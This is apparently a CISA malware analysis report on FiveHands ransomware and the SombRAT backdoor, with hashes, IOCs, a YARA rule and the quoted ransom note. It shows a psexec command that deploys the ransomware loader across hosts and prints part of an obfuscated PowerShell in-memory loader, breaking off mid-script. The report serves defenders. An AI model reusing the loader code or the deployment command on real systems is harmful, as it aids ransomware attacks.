{
  "markdown": "\n\n\n\n\n\n\nNotification\n\nThis report is provided \"as is\" for informational purposes only. The Department of Homeland Security (DHS) does not provide any warranties of any kind regarding any information contained herein. The DHS does not endorse any commercial product or service referenced in this bulletin or otherwise.\nThis document is marked TLP:WHITE--Disclosure is not limited. Sources may use TLP:WHITE when information carries minimal or no foreseeable risk of misuse, in accordance with applicable rules and procedures for public release. Subject to standard copyright rules, TLP:WHITE information may be distributed without restriction. For more information on the Traffic Light Protocol (TLP), see http://www.us-cert.gov/tlp.\n\nSummary\n\nDescription\nThis Malware Analysis Report (MAR) is the result of analytic efforts by the Cybersecurity and Infrastructure Security Agency (CISA) to provide detailed analysis of 18 malicious files submitted to CISA. Eight of the files are open-source penetration testing and exploitation tools, one file is a new ransomware variant, which CISA refers to as FiveHands. The remaining files are associated with the SombRAT remote access trojan (RAT).\n\n\t\t\tCISA is aware of a recent successful cyberattack against an organization using FiveHands ransomware, SombRAT, and open-source tools to ultimately steal information, obfuscate files, and demand a ransom. For more information, refer to Analysis Report AR21-126A.\n\n\t\t\tCISA is distributing this MAR, which includes suggested response actions and recommended mitigation techniques, to enable network defense and reduce exposure to malicious activity.\nFor a downloadable copy of IOCs, see: MAR-10324784-1.v1.stix.\nSubmitted Files (18)\n18229920a45130f00539405fecab500d8010ef93856e1c5bcabf5aa5532b3311 (RouterScan.exe)\n2703aba98d6ecf0bf0b5aafe70edc4bc14d223a11021990bfb10acf5641d3a12 (ServeManager.exe)\n3337e3875b05e0bfba69ab926532e3f179e8cfbf162ebb60ce58a0281437a7ef (PsExec.exe)\n495a0ccc38fb8f22b48025f030617978cf5fdc3df3fed32b1410ad47747ae177 (rclone.exe)\n4de1bd4b1bb28ed0897b9d3c5d16a4b1442c7f53cb389cbed82af189696d3f40 (WwanSvc.txt)\n5608c12872229acd84f33bf6c667a1b43d112594b2b5f47f923d631bcce6090c (netscan.lic)\n5f312e137beb1ce75f8fdf03a59e1b3cba3dc57ccc16e48daee3ee52c08fa149 (s3browser-9-5-3.exe)\n7d57e0ba8b36ec221b16807ce4e13a1125d53922fa50c3827a5ebd6811736ffd (grabff.exe)\n911a88fe16efca24206f1786242615596e67a9336bc670c1e44a33727987d886 (WwanSvc.c__2)\na710f573f73c163d54c95b4175706329db3ed89cd9337c583d0bb24b6a384789 (netscan.exe)\na7f5097c0d991c9bbd5f2694ec8c9b484e2ab583d362c42c30556f1271cc8aaa (WwanSvc.a__2)\nbfc50bf40aae3b41d77169fba45c332b8c60406b403af647f1bb083918a33b9e (59fb3174bb34e803)\nc0a214a60daac6f0ba01ce9128d42bb2d8e81909f4b87963de340ab8627a6b0b (WwanSvc.b__2)\nc5a1dbb49ff72a69ac7c52b18e57a21527bc381077b1cea12c3a40e9e98ae6cd (WwanSvc.b)\nccacf4658ae778d02e4e55cd161b5a0772eb8b8eee62fed34e2d8f11db2cc4bc (WwanSvc.bat)\nd3d5e5a8a40f34fc8d89b2d74d89a4b101d8b95a79e990e3b4161282aa6aca32 (WwanSvc.c)\ndec8655cdd7214daf9579ef481d0b0c6ed8120c120d3bd8ec27cb6e1874eb291 (WwanSvc.a)\ne4b67b8ffcc1ed95d3ff26622ab4c67a329f76bd76d0f523f5986e67969354b7 (netscan.xml)\nDomains (1)\nfeticost.com\nIPs (1)\n51.89.50.152\n\nFindings\n\na710f573f73c163d54c95b4175706329db3ed89cd9337c583d0bb24b6a384789\nTags\nreconnaissance\nDetails\n\n\n\nName\nnetscan.exe\n\n\nSize\n16539648 bytes\n\n\nType\nPE32+ executable (GUI) x86-64, for MS Windows\n\n\nMD5\n132071dc69b875d239f133984655a26a\n\n\nSHA1\n398d769e0d478175acbdbe9a790b2f6982110e8d\n\n\nSHA256\na710f573f73c163d54c95b4175706329db3ed89cd9337c583d0bb24b6a384789\n\n\nSHA512\nd1263b794b7f0061354f60203a8182d5e34d49347708102712e844f06cd74f4d9d49e2a7e43457b5555a77aefba36c129d2fc01bc7955de277dbe1b0f723cf56\n\n\nssdeep\n393216:2qYAOa2Y/FPGk5oEwxnGNqsnFZur3Ilmsi2e2fkK5:vfN\n\n\nEntropy\n6.000632\n\n\n\nAntivirus\nNo matches found.\nYARA Rules\nNo matches found.\nssdeep Matches\nNo matches found.\nPE Metadata\n\n\n\nCompile Date\n2020-08-06 20:31:49-04:00\n\n\nImport Hash\n4e157a70f40af9369da3829aa8ddec74\n\n\nCompany Name\nSoftPerfect\n\n\nFile Description\nMultipurpose IPv4/IPv6 network scanner\n\n\nInternal Name\nNone\n\n\nLegal Copyright\n2003-2020 SoftPerfect Pty Ltd\n\n\nOriginal Filename\nNone\n\n\nProduct Name\nSoftPerfect Network Scanner\n\n\nProduct Version\n7.2.9.0\n\n\n\nPE Sections\n\n\n\nMD5\nName\nRaw Size\nEntropy\n\n\nad11d214295fb4d9adbd1a066255e7e8\nheader\n1024\n2.500134\n\n\nfbbeea3396c7ca2cd30104101f97dd27\n.text\n12265984\n5.683312\n\n\nd425ff242ca206cce40263fb2d78352e\n.data\n1124352\n5.248152\n\n\nd41d8cd98f00b204e9800998ecf8427e\n.bss\n0\n0.000000\n\n\n1e3b134f1ab07c35cd49080aedf68c18\n.idata\n27648\n4.329594\n\n\n5d470e5b330b899ac683ef2627311ffa\n.didata\n7168\n3.476858\n\n\n452453fac6e2a76251515b28f624b92c\n.edata\n512\n1.885498\n\n\nd41d8cd98f00b204e9800998ecf8427e\n.tls\n0\n0.000000\n\n\n7a90a77855dd773a08f7d918f96281ff\n.rdata\n512\n1.435338\n\n\n16417b0690d1cef091d32e0a12f00e3b\n.pdata\n544768\n6.558393\n\n\n990e366d847735de51e2a9176ecadaec\n.rsrc\n2567680\n6.480051\n\n\n\nRelationships\n\n\n\na710f573f7...\nCreated\ne4b67b8ffcc1ed95d3ff26622ab4c67a329f76bd76d0f523f5986e67969354b7\n\n\na710f573f7...\nRelated_To\n5608c12872229acd84f33bf6c667a1b43d112594b2b5f47f923d631bcce6090c\n\n\n\nDescription\nThis artifact is a stand-alone version of the SoftPerfect Network Scanner, version 7.2.9 for 64-bit operating systems. Information from the SoftPerfect website follows:\n\n\t\t\t--Begin information--\n\t\t\t\"SoftPerfect Network Scanner can ping computers, scan ports, discover shared folders and retrieve practically any information about network devices, via WMI, SNMP, HTTP, SSH and PowerShell. It also scans for remote services, registry, files and performance counters; offers flexible filtering and display options and exports NetScan results to a variety of formats from XML to JSON.\"\n\t\t\t--End information--\n\n\t\t\tThe utility can also be used with Nmap for vulnerability scanning. The utility will generate a report of its findings called 'netscan.xml' (e4b67b8ffcc1ed95d3ff26622ab4c67a329f76bd76d0f523f5986e67969354b7).\n\n\ne4b67b8ffcc1ed95d3ff26622ab4c67a329f76bd76d0f523f5986e67969354b7\nTags\nreconnaissance\nDetails\n\n\n\nName\nnetscan.xml\n\n\nSize\n41200 bytes\n\n\nType\nXML 1.0 document, ASCII text, with CRLF line terminators\n\n\nMD5\ne1c8bb6fa3e7fe03320313e568c796c4\n\n\nSHA1\n1ce6808e65b517b3305f397af868168f3f8cd24b\n\n\nSHA256\ne4b67b8ffcc1ed95d3ff26622ab4c67a329f76bd76d0f523f5986e67969354b7\n\n\nSHA512\n2a1b9d06d9c6c3b607dc1b5bf48645ef4a47adaff4a193ab77cf416505a8eed8104250bff74de68135cdccb883bff517b71f3c469b77dc06a60c53614cbba0bd\n\n\nssdeep\n384:x7noJi3jCFQU6imIyHc+j8/H/fy/fJ/fq/uIpMfBxakR5NmSN1Sv:RnOQXI+j8/H/fy/fJ/fq/uTf7rNmS2v\n\n\nEntropy\n4.852693\n\n\n\nAntivirus\nNo matches found.\nYARA Rules\nNo matches found.\nssdeep Matches\nNo matches found.\nRelationships\n\n\n\ne4b67b8ffc...\nCreated_By\na710f573f73c163d54c95b4175706329db3ed89cd9337c583d0bb24b6a384789\n\n\n\nDescription\nThis artifact is an Extensible Markup Language (XML) document reporting scanning results for the SoftPerfect Network Scanner program. The XML document indicates that a random scan was conducted to identify hostnames on a network and search for web servers, file servers, database servers as well as search for any open Remote Desktop Protocol (RDP) ports for several subnets of unroutable Internet Protocol (IP) addresses.\n\n\n5608c12872229acd84f33bf6c667a1b43d112594b2b5f47f923d631bcce6090c\nTags\nreconnaissance\nDetails\n\n\n\nName\nnetscan.lic\n\n\nSize\n807 bytes\n\n\nType\nXML 1.0 document, ASCII text, with very long lines, with CRLF line terminators\n\n\nMD5\n49bda214f3c635209d2657ca2d395400\n\n\nSHA1\n55ec058fee5c6eeb0f2a492c444371bc11e2edb8\n\n\nSHA256\n5608c12872229acd84f33bf6c667a1b43d112594b2b5f47f923d631bcce6090c\n\n\nSHA512\na177596594195f83288b94ee6327e7d76bb7465a7745d43eff20609324ee194816c0aa7dd3580c6992536e28361e4e39fb228bb9f449b0bc427fea9e40303d6d\n\n\nssdeep\n12:TMGBMWHA+1llfFNKNu9Mdhy96v7C61mnKb3vEjycE1IKV7X5ThQaisyoMkZtE/jQ:3BMY5jPMdnGpKL8cVr5TyoFXmYdz\n\n\nEntropy\n5.985489\n\n\n\nAntivirus\nNo matches found.\nYARA Rules\nNo matches found.\nssdeep Matches\nNo matches found.\nRelationships\n\n\n\n5608c12872...\nRelated_To\na710f573f73c163d54c95b4175706329db3ed89cd9337c583d0bb24b6a384789\n\n\n\nDescription\nTo unlock all of the features of the SoftPerfect Network Scanner, a license is required. This artifact is the Network Scanner license that was included with this submission. The license name is 'DeltaFoX'.\n\n\n3337e3875b05e0bfba69ab926532e3f179e8cfbf162ebb60ce58a0281437a7ef\nTags\ntrojanutility\nDetails\n\n\n\nName\nPsExec.exe\n\n\nSize\n339096 bytes\n\n\nType\nPE32 executable (console) Intel 80386, for MS Windows\n\n\nMD5\n27304b246c7d5b4e149124d5f93c5b01\n\n\nSHA1\ne50d9e3bd91908e13a26b3e23edeaf577fb3a095\n\n\nSHA256\n3337e3875b05e0bfba69ab926532e3f179e8cfbf162ebb60ce58a0281437a7ef\n\n\nSHA512\nbec172a2f92a95796199cfc83f544a78685b52a94061ce0ffb46b265070ee0bcc018c4f548f56018bf3ff1e74952811b2afb6df79ab8d09f1ec73c9477af636b\n\n\nssdeep\n3072:Yao79VuJ6titIi/H7ZUFgllxiBD+P5xWr3geNtdS+DlGttzhA9HY4ZUFxPkwlmlP:YaSq4TBWISSTgu7DlGtEC1xn/O5r4S\n\n\nEntropy\n6.384233\n\n\n\nAntivirus\n\n\n\nFilseclab\nTrojan.Generic.dlwa\n\n\nSophos\nApp/PsExec-Gen\n\n\n\nYARA Rules\nNo matches found.\nssdeep Matches\nNo matches found.\nPE Metadata\n\n\n\nCompile Date\n2016-06-28 14:43:09-04:00\n\n\nImport Hash\nc1e59519b5e5d84af07afa6f5a8625f1\n\n\nCompany Name\nSysinternals - www.sysinternals.com\n\n\nFile Description\nExecute processes remotely\n\n\nInternal Name\nPsExec\n\n\nLegal Copyright\nCopyright (C) 2001-2016 Mark Russinovich\n\n\nOriginal Filename\npsexec.c\n\n\nProduct Name\nSysinternals PsExec\n\n\nProduct Version\n2.2\n\n\n\nPE Sections\n\n\n\nMD5\nName\nRaw Size\nEntropy\n\n\n7cfa223c41f292fcbcf6b4bc2450b9d8\nheader\n1024\n2.762995\n\n\nc9b5782085d470d0c2311dc4aaa3e135\n.text\n99840\n6.586757\n\n\nc584cc8d01770f418f361866f1875866\n.rdata\n59392\n4.596671\n\n\n5172fd3fffd89c75d05b1f62ba527455\n.data\n9216\n2.182345\n\n\nbfbb6b1ebaff1f3ff6874d8100f7a64b\n.rsrc\n147456\n6.378895\n\n\n71d427456a8bd35b3821f185880b287a\n.reloc\n6144\n6.631418\n\n\n\nPackers/Compilers/Cryptors\n\n\n\nMicrosoft Visual C++ ?.?\n\n\n\nDescription\nThis artifact is the legitimate remote administration program, called psexec.exe. This tool is part of Microsoft's Sysinternals tool suite. This utility was used to execute the program ServeManager.exe with the following arguments:\n\n\t\t\t---Begin Command Line Arguments---\n\t\t\tpsexec.exe -d @comps.txt -s -relatime -c ServeManager.exe -key xxxxxxxxxxxxxxxx\n\t\t\t---End Command Line Arguments---\n\n\t\t\tThe above arguments are defined as follows:\n\n\t\t\t---Begin Argument Definitions---\n\t\t\t-d --> Run psexec.exe without any prompts.\n\t\t\t@ --> Remotely access this list of hostnames/IP addresses.\n\t\t\t-s --> Run the program with system level privileges.\n\t\t\t-relatime --> This is a typo. This should be -realtime, or run this process before any other process.\n\t\t\t-c --> Copy the program to the remote system before executing.\n\t\t\t---End Argument Definitions---\n\n\n2703aba98d6ecf0bf0b5aafe70edc4bc14d223a11021990bfb10acf5641d3a12\nTags\ndropperobfuscatedtrojan\nDetails\n\n\n\nName\nServeManager.exe\n\n\nSize\n253456 bytes\n\n\nType\nPE32 executable (GUI) Intel 80386, for MS Windows\n\n\nMD5\nc095498fc44d680ad8b4efeb014d339f\n\n\nSHA1\nad571ef3c255c8806a09d50ac504cf4bfce8aca0\n\n\nSHA256\n2703aba98d6ecf0bf0b5aafe70edc4bc14d223a11021990bfb10acf5641d3a12\n\n\nSHA512\n029202e8a32f36b8496bb4a09525fa372feec264e9cf1864f469676b7e1560b2bc7917e7799636de8d2e7df7f568e9418c49ac9fa3f1aba91ececd138bcacb51\n\n\nssdeep\n6144:tVgUc9JwBsHC/WwblTClkO0hoS19E42nXkBIC:t09WBsH2WwbFCeO0X6XjC\n\n\nEntropy\n7.609914\n\n\n\nAntivirus\n\n\n\nAhnlab\nMalware/Win32.Trojan\n\n\nBitdefender\nGen:Variant.Zusy.375932\n\n\nESET\na variant of Win32/Filecoder.DeathRansom.F trojan\n\n\nEmsisoft\nGen:Variant.Zusy.375932 (B)\n\n\nIkarus\nTrojan-Ransom.DeathRansom\n\n\nK7\nRiskware ( 0040eff71 )\n\n\nLavasoft\nGen:Variant.Zusy.375932\n\n\nMicrosoft Security Essentials\nRansom:Win32/FileCryptor.PAC!MTB\n\n\nNANOAV\nTrojan.Win32.Redcap.itrfgt\n\n\nSystweak\nmalware.generic\n\n\nVirusBlokAda\nTrojan.Tiggre\n\n\nZillya!\nTrojan.Filecoder.Win32.18232\n\n\n\nYARA Rules\n\nrule CISA_10324784_01 : ransomware trojan loader FIVEHANDS\n\t\t\t\t{\n\t\t\t\t\u00a0\u00a0\u00a0meta:\n\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0Author = \"CISA Code & Media Analysis\"\n\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0Incident = \"10324784\"\n\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0Date = \"2021-03-23\"\n\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0Last_Modified = \"20210323_1100\"\n\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0Actor = \"n/a\"\n\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0Category = \"Ransomware Trojan Loader\"\n\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0Family = \"FIVEHANDS\"\n\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0Description = \"Detects Five Hands Ransomware Loader\"\n\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0MD5_1 = \"c095498fc44d680ad8b4efeb014d339f\"\n\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0SHA256_1 = \"2703aba98d6ecf0bf0b5aafe70edc4bc14d223a11021990bfb10acf5641d3a12\"\n\t\t\t\t\u00a0\u00a0\u00a0strings:\n\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$s0 = { 2D 00 6B 00 65 00 79 }\n\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$s1 = \"GetCommandLineW\"\n\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$s2 = \"CommandLineToArgvW\"\n\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$s3 = { 81 39 50 45 00 00 }\n\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$s4 = { B9 4D 5A 00 00 }\n\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$s5 = { 8B C3 C1 E8 10 83 E9 10 0F B6 C0 }\n\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$s6 = { 8B CA C1 E9 08 0F B6 D1 8B 4D F0 C1 E9 10 0F B6 C9 }\n\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$s7 = { 8B 3C 96 03 F9 33 F6 }\n\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$s8 = { 85 C0 74 02 FF D0 }\n\t\t\t\t\u00a0\u00a0\u00a0condition:\n\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0all of them\n\t\t\t\t}\n\nssdeep Matches\nNo matches found.\nPE Metadata\n\n\n\nCompile Date\n2021-01-19 02:05:55-05:00\n\n\nImport Hash\n8517cf209c905e801241690648f36a97\n\n\n\nPE Sections\n\n\n\nMD5\nName\nRaw Size\nEntropy\n\n\nf5922d8b7fdbacccee657c9937f420c0\nheader\n1024\n2.699721\n\n\n69651f6a58de87e3d888a2a5260db050\n.text\n68608\n6.686025\n\n\n174a90746e521c22a6d696e5c1f071ee\n.rdata\n27648\n5.194163\n\n\nb3d0dd819218729fc349c63ce16b6252\n.data\n2560\n2.221845\n\n\nbd90dc8684f5b3e44d9b014e286e1319\n.rsrc\n512\n4.710061\n\n\n4c6042cddd17092933f1f367920cc3b6\n.reloc\n5120\n6.461440\n\n\n\nPackers/Compilers/Cryptors\n\n\n\nMicrosoft Visual C++ ?.?\n\n\n\nDescription\nThis artifact is a 32-bit executable file that is executed using the Microsoft Sysinternals remote administration tool, psexec.exe. When the program is executed it will attempt to load into memory a large embedded module that is decoded with a supplied key, 'xxxxxxxxxxxxxxxx'. The module is decoded in memory and checked to verify that it has a PE header. If the header is verified, the payload is executed.\n\n\t\t\tThe payload is a 32-bit executable file that is used to encrypt files on the victim\u2019s system to extort a ransom. When the ransomware is executed, it will enumerate files and folders on the system and encrypt files with the extensions, .txt, .chm, .dat, .ocx, .js, .tlb, .vbs, .sys, .lnk, .xml, .jpg, .log, .zip, .htm, .ini, .gif, .html, .css, and others. Key system files are not encrypted.\n\n\t\t\tThe ransomware uses a public key encryption scheme called \"NTRUEncrypt\". To thwart the recovery of the data, it uses Windows Management Instrumentation (WMI) to enumerate Volume Shadow copies using the command \u201c select * from Win32_ShadowCopy\u201d and then deletes copies by ID (Win32_ShadowCopy.ID). The malware will also encrypt files in the recovery folder at C:\\Recovery. After the files are encrypted the program will write a ransom note to each folder and directory on the system called \u2018read_me_unlock.txt\u2019. The following is the content of the ransom note:\n\n\t\t\t---Begin Ransom Note---\n\t\t\tHello, you were hacked, and your files were encrypted. ! Do not try to change the file extensions yourself, it may result in an error during decryption! Contact us and we can solve it all.\n\n\t\t\tIf you start an independent recovery, or contact the police and other authorities, we will continue, but this time for all your clients. We also want to assure you of our seriousness, in case of refusal from the dialogue, we will use not one, 0 day, but several, also your source codes will be sold from auctions in 5 hands.\n\n\t\t\tEmail contact: xxxxxxxxxxxx[@]protonmail.com\n\n\t\t\tOR\n\n\t\t\t-- Contact with us by method below\n\t\t\t1) Open this website in TOR browser: hxxp[:]//xxxxxxxxxxxxxxxx.onion/xxxxxxxxxxxxxxxxxxxx\n\t\t\t2) Follow instructions in chat.\n\t\t\t---End Ransom Note---\n\n\nccacf4658ae778d02e4e55cd161b5a0772eb8b8eee62fed34e2d8f11db2cc4bc\nTags\nbackdoorloadertrojan\nDetails\n\n\n\nName\nWwanSvc.bat\n\n\nSize\n247 bytes\n\n\nType\nDOS batch file, ASCII text, with CRLF line terminators\n\n\nMD5\n1f6495ea7606a15daa79be93070159a8\n\n\nSHA1\nfdf9b1098480dd4145d7d39dc1b75fb6180e09ec\n\n\nSHA256\nccacf4658ae778d02e4e55cd161b5a0772eb8b8eee62fed34e2d8f11db2cc4bc\n\n\nSHA512\n55abb0a936c3631e424748085b353e67ca8209006e92365c3fd3f256569f05ae99efeff818d1eefabba47fb11f59644c0e926027c30fbe076eee4dd899013815\n\n\nssdeep\n6:hsQLpjR9nyDzLgyKBM3S1R1KCsu2xKRYPdpVjku5HjJVGnyn:CQdjR9nYLgyaIS1PKC2l1pVh5HjJsny\n\n\nEntropy\n5.360619\n\n\nPath\nC:\\ProgramData\\Microsoft\\WwanSvc\\\n\n\n\nAntivirus\n\n\n\nAhnlab\nBackdoor/BAT.Runner\n\n\nMicrosoft Security Essentials\nTrojan:BAT/Somrat\n\n\n\nYARA Rules\nNo matches found.\nssdeep Matches\nNo matches found.\nRelationships\n\n\n\nccacf4658a...\nUsed\n4de1bd4b1bb28ed0897b9d3c5d16a4b1442c7f53cb389cbed82af189696d3f40\n\n\n\nDescription\nThis artifact is a batch file. When executed it will invoke PowerShell, which decodes and executes a base64 encoded PowerShell script called \"WwanSvc.txt\" (4de1bd4b1bb28ed0897b9d3c5d16a4b1442c7f53cb389cbed82af189696d3f40) in the path C:\\ProgramData\\Microsoft\\WwanSvc\\.\n\n\n4de1bd4b1bb28ed0897b9d3c5d16a4b1442c7f53cb389cbed82af189696d3f40\nTags\nloaderobfuscated\nDetails\n\n\n\nName\nWwanSvc.txt\n\n\nSize\n9838 bytes\n\n\nType\nASCII text, with very long lines, with CRLF line terminators\n\n\nMD5\n3c3770c42665416a9b3f2deda1056aed\n\n\nSHA1\nb93122942f58693936f060224d1b798ff23fe547\n\n\nSHA256\n4de1bd4b1bb28ed0897b9d3c5d16a4b1442c7f53cb389cbed82af189696d3f40\n\n\nSHA512\nb9a04d2109746c37f73f1d651532e8ccf63b21756a9da920b0aab331deb9ad5c506e7a856e137a7965ec11c7742940583d5c197d7e472b23eb9c59476d9be9ae\n\n\nssdeep\n192:ZxFpwcjL3ceUZQR2Z1Pgk4HxE8TDEGJ5PWJ/LVkZCfjDR5CBtDKLODZAaxeS9gNm:ZxFpjMeUiygk4HyiHvujSZCbstuCrg0v\n\n\nEntropy\n5.663394\n\n\nPath\nC:\\ProgramData\\Microsoft\\WwanSvc\\\n\n\n\nAntivirus\nNo matches found.\nYARA Rules\nNo matches found.\nssdeep Matches\nNo matches found.\nRelationships\n\n\n\n4de1bd4b1b...\nUsed\ndec8655cdd7214daf9579ef481d0b0c6ed8120c120d3bd8ec27cb6e1874eb291\n\n\n4de1bd4b1b...\nUsed\nd3d5e5a8a40f34fc8d89b2d74d89a4b101d8b95a79e990e3b4161282aa6aca32\n\n\n4de1bd4b1b...\nUsed_By\nccacf4658ae778d02e4e55cd161b5a0772eb8b8eee62fed34e2d8f11db2cc4bc\n\n\n\nDescription\nThis artifact is a Base64 encoded PowerShell script that is decoded and executed by WwanSvc.bat (ccacf4658ae778d02e4e55cd161b5a0772eb8b8eee62fed34e2d8f11db2cc4bc). The decoded content of the file follows:\n\n\t\t\t---Begin Decoded PowerShell Script---\n\n\t\t\tFunction ge`T-proCad`dreSS\n\t\t\t{\n\t\t\tParam\n\t\t\t(\n\t\t\t[OutputType([IntPtr])]\n\n\t\t\t[Parameter( poSITion = 0, MAnDAToRY = ${t`RuE} )]\n\t\t\t[String]\n\t\t\t${mo`DUlE},\n\n\t\t\t[Parameter( PosITion = 1, MAnDatoRy = ${TR`Ue} )]\n\t\t\t[String]\n\t\t\t${PRo`CED`UrE}\n\t\t\t)\n\n\t\t\t${sYsT`e`mAsSE`mbly} = [AppDomain]::\"cUrr`eN`Tdo`maIN\".\"g`EtasS`emblieS\"() | W`He`Re-ObJECt { ${_}.\"GL`OBA`LAs`sEm`Bl`ycAcHE\" -And ${_}.\"LOCA`T`IOn\".\"s`plIT\"((('{0}{0}') -f [ChAR]92))[-1].\"eQU`Als\"(('Sys'+'tem.dl'+'l')) }\n\t\t\t${uNs`AFe`N`ATiV`emethoDs} = ${s`yStEM`ASS`E`mbLY}.\"Getty`pe\"(('Mic'+'roso'+'ft.'+'Win'+'32.U'+'nsafeN'+'at'+'i'+'ve'+'Methods'))\n\n\t\t\t${g`eTmo`DuLE`Han`d`LE} = ${uNSAF`E`NAtIVE`Met`H`O`ds}.\"gE`TmethOd\"(('G'+'etModule'+'Hand'+'le'))\n\t\t\t${G`EtpROCa`d`dre`sS} = ${unS`AFEnA`T`iVEmE`ThoDs}.\"g`ETMe`THoD\"(('GetPr'+'oc'+'Addr'+'ess'), [reflection.bindingflags] ('Publi'+'c,Sta'+'t'+'i'+'c'), ${n`UlL}, [System.Reflection.CallingConventions]::\"A`Ny\", @((NE`w-OBj`ECT ('S'+'y'+('ste'+'m'+'.R')+('un'+'time'+'.Int')+'er'+('op'+'Se')+'r'+'v'+('ice'+'s.Han'+'d')+('le'+'R')+'ef')).\"G`ettYPe\"(), [string]), ${N`ULl});\n\n\t\t\t${KErN`3`2`HA`NDLe} = ${gEtMoD`U`leha`NDLE}.\"in`VOkE\"(${nu`ll}, @(${m`OdU`lE}))\n\t\t\t${t`M`pPTr} = ne`w-`obJEcT (('IntP'+'t')+'r')\n\t\t\t${H`A`N`dLERef} = N`eW-OB`je`cT ('Sy'+'s'+'te'+('m'+'.'+'Runt')+'i'+('m'+'e.Inte'+'rop'+'Se'+'rvices.Ha')+('n'+'dl')+('eRe'+'f'))(${tM`pP`TR}, ${K`ERn32H`AnD`Le})\n\n\t\t\tWr`ItE-ouTP`UT ${gETp`RO`c`AdDRE`Ss}.\"i`N`VOke\"(${nu`LL}, @([System.Runtime.InteropServices.HandleRef]${h`A`Ndle`REF}, ${Pro`Ced`Ure}))\n\t\t\t}\n\n\n\t\t\tFunction G`E`TdELtYPE\n\t\t\t{\n\t\t\tParam\n\t\t\t(\n\t\t\t[OutputType([Type])]\n\n\t\t\t[Parameter( POSItion = 0)]\n\t\t\t[Type[]]\n\t\t\t${Pa`R`AMeT`eRs} = (New-`oB`ject (('T'+'ype')+'[]')(0)),\n\n\t\t\t[Parameter( poSitIon = 1 )]\n\t\t\t[Type]\n\t\t\t${rE`T`UrntYpE} = [Void]\n\t\t\t)\n\n\t\t\t${d`OmaIN} = [AppDomain]::\"cUrRenTdOM`A`In\"\n\t\t\t${DYN`AssE`mBLY} = NEW`-oBje`CT ('S'+'y'+('stem.'+'Re'+'fl')+('ec'+'ti')+('on.'+'As')+('s'+'emb')+('l'+'yN')+('a'+'me'))(('Ref'+'lec'+'ted'+'De'+'leg'+'ate'))\n\t\t\t${AssEM`Bl`y`BU`ild`Er} = ${d`OMa`IN}.\"defiNED`yNa`Mi`C`ASs`eM`Bly\"(${DY`NasSEmB`lY}, [System.Reflection.Emit.AssemblyBuilderAccess]::\"r`Un\")\n\t\t\t${mOD`UL`EBUil`dEr} = ${AsSemBlyB`Ui`Ld`ER}.\"DeF`I`NE`dynA`MicmoD`UlE\"(('InMe'+'m'+'ory'+'Mo'+'dule'), ${F`Alse})\n\t\t\t${T`yP`eB`UiLdeR} = ${m`oDuleBUILD`eR}.\"dEfIn`Et`Ype\"(('md'+'elty'+'pe'), ('Class, Public'+', Sealed, '+'Ans'+'i'+'C'+'lass, '+'A'+'u'+'toC'+'la'+'s'+'s'), [System.MulticastDelegate])\n\t\t\t${CON`sTR`UctOR`BuILdeR} = ${TypE`Bui`ld`er}.\"De`FiN`ECoNs`TrucT`OR\"(('RT'+'Special'+'Na'+'me'+', HideBySi'+'g'+', Publi'+'c'), [System.Reflection.CallingConventions]::\"s`TANda`Rd\", ${PArame`Te`Rs})\n\t\t\t${construc`T`o`RbUi`LdER}.\"sEt`I`MpLeMEnTA`TiON`Flags\"(('Runti'+'me'+','+' Managed'))\n\t\t\t${m`Eth`od`BUI`ldEr} = ${T`YPEB`U`iLdER}.\"dE`FiN`eMeT`hOD\"('Invoke', ('Pu'+'blic, '+'Hid'+'eBy'+'Sig,'+' New'+'S'+'l'+'ot, '+'V'+'irtual'), ${RETUr`Nt`yPe}, ${par`AMET`ErS})\n\t\t\t${M`e`ThODbui`lDeR}.\"S`eti`mplEmEnTAT`ioNf`lAGs\"(('Runti'+'me,'+' Man'+'a'+'g'+'ed'))\n\n\t\t\tw`RiTe-`oUtPUt ${t`YP`eBu`IlDEr}.\"cr`E`AtETy`Pe\"()\n\t\t\t}\n\n\t\t\tFunction g`EtW32\n\t\t\t{\n\t\t\t${W`32} = New`-oBje`cT (('Sy'+'s')+('tem.O'+'bje')+'ct')\n\n\t\t\t${Vp`A`dDR} = Ge`T-pr`OCaddRess (('ke'+'rn')+'el'+('32'+'.d'+'ll')) ('V'+('i'+'rtu'+'alPr')+'o'+('tec'+'t'))\n\t\t\t${VpD`el} = gEt`D`elT`Ype @([IntPtr], [UIntPtr], [UInt32], [UInt32].\"mA`K`EbyR`e`FType\"()) ([Bool])\n\t\t\t${V`p} = [System.Runtime.InteropServices.Marshal]::\"gETD`ElEgAte`FORfUnCTI`oNP`oINt`Er\".Invoke(${VP`Ad`dR}, ${v`PDEL})\n\t\t\t${W`32} | aD`d-`m`eMbEr (('Not'+'e')+('Pr'+'oper')+'t'+'y') -Name (('V'+'irtu')+'al'+('P'+'ro'+'tec')+'t') -Value ${v`P}\n\n\t\t\t${wPM`AdDr} = gE`T`-P`ROc`AddRess (('ke'+'rne')+('l3'+'2')+('.d'+'ll')) ('W'+('r'+'ite')+'P'+('ro'+'ce')+('s'+'sM')+('e'+'mory'))\n\t\t\t${W`Pmdel} = GeT`d`eLTyPE @([IntPtr], [IntPtr], [IntPtr], [UIntPtr], [UIntPtr].\"MAkE`ByrEFT`YpE\"()) ([Bool])\n\t\t\t${w`pM} = 